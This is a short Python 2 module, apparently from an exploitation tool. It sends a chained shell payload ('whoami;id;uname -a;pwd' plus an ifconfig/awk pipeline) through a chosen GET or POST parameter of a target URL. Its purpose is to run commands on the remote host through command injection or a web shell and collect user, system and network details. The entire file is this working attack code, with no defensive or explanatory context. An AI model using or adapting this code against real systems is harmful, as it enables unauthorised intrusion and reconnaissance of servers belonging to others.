from urllib import urlencode, quote
from urllib2 import urlopen, Request
from menu import getargs

url = getargs.url
method = getargs.method
parameter = getargs.parameter


class RequestType(object):
    def __init__(self, url=None, method='get', parameter=None):
        self.url = url
        self.method = method
        self.parameter = parameter
        self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''

    def get_page_source(self):
        if method == 'post' or parameter:
            request = Request(url)
            parameters = urlencode({parameter: self.cmd})
            return urlopen(request, parameters)
        else:
            return urlopen('{}{}'.format(url, quote(self.cmd)))

request_type = RequestType()
